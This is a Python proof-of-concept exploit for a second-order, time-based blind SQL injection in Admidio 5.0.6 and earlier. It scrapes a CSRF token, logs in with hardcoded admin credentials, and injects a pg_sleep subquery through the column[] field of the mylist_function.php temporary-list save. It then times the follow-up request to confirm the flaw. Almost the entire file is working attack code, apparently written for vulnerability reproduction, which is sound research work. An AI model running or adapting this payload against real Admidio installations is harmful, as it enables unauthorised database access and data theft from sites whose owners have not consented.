
#!/usr/bin/env python3
"""Admidio <= 5.0.6 second-order SQL injection PoC (time-based blind injection)"""
import os
import requests
import re
import time
import urllib3
from loguru import logger
urllib3.disable_warnings()

# ============ Configuration ============
TARGET = os.getenv("ADMIDIO_TARGET", "http://localhost:3100")
USERNAME = "admin"
PASSWORD = "Aa!123456"
# =============================

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": "Mozilla/5.0"})

def show(step, resp):
    print(f"[+] Step {step}: {resp.request.method} {resp.request.path_url} "
          f"-> {resp.status_code} X-Request-Id: {resp.headers.get('X-Request-Id')}")

# 1. Get the CSRF token
r = s.get(f"{TARGET}/modules/overview.php")
logger.info(f"GET overview {r.headers.get('X-Request-Id')}")
show(1, r)
token_match = re.search(r'"adm_csrf_token" value="([^"]+)"', r.text)
if not token_match:
    print(f"[-] CSRF token not found; current page: {r.url}")
    print("[*] The scene may be on the install/upgrade page; completed the minimum observable request.")
    raise SystemExit(0)
token = token_match.group(1)
print(f"[+] CSRF Token: {token}")

# 2. Login
r = s.post(f"{TARGET}/system/login.php?mode=check", data={
    "adm_csrf_token": token,
    "plg_usr_login_name": USERNAME,
    "plg_usr_password": PASSWORD
})
if r.json().get("status") != "success":
    print("[-] Login failed")
    exit()
print("[+] Login succeeded")
logger.info(f"POST login {r.headers.get('X-Request-Id')}")
show(2, r)

# 3. Get Role UUID from any role list page
r = s.get(f"{TARGET}/modules/groups-roles/groups_roles.php")
role_uuid = re.search(r'role_list=([a-f0-9-]{36})', r.text).group(1)
logger.info(f"GET groups_roles {r.headers.get('X-Request-Id')}")
show(3, r)
print(f"[+] Role UUID: {role_uuid}")

# 4. Get the injection page CSRF token; preparation step, not included in attack_rids.json
url = f"{TARGET}/modules/groups-roles/mylist.php"
# Extract CSRF token
resp = s.get(url, verify=False)
logger.info(f"GET mylist {resp.headers.get('X-Request-Id')}")
print(f"[setup] Step 4: {resp.request.method} {resp.request.path_url} "
      f"status={resp.status_code} RID: {resp.headers.get('X-Request-Id')}")
token_match = re.search(r'"adm_csrf_token" value="(.*?)"', resp.text, re.S)
token = token_match.group(1) if token_match else None
if token:
    print(f"[+] CSRF Token: {token}")
else:
    print("[-] CSRF token was not found on this page")

# 5. Send injection payload
print("[*] Injecting...")

r = s.post(
    f"{TARGET}/modules/groups-roles/mylist_function.php",
    params={"mode": "save_temporary"},
    data={
        "adm_csrf_token": token,
        "column[]": ["usr_uuid", "usr_login_name,(SELECT 1 FROM (SELECT pg_sleep(3))a)--"],
        "sort[]": ["", ""],
        "condition[]": ["", ""],
        "sel_roles[]": role_uuid
    }
)
logger.info(f"POST mylist_function rid={r.headers.get('X-Request-Id')}")
show(5, r)
resp_dict = r.json()
final_url = resp_dict.get("url", "")
print(f"[*] Final request URL: {final_url}")

start = time.time()
r = s.get(f"{final_url}", verify=False)  # Visit the final URL to trigger injection
elapsed = time.time() - start

logger.info(f"GET final rid={r.headers.get('X-Request-Id')}")
show(6, r)
# 6. Check result
if r.status_code == 200:
    if elapsed >= 3:
        print(f"[!!!] Vulnerability exists; response delay {elapsed:.1f}s (>=3s)")
    else:
        print(f"[-] No delay detected ({elapsed:.1f}s), the target may not be affected")
else:
    print(f"[-] Injection failed: {r.text[:200]}")
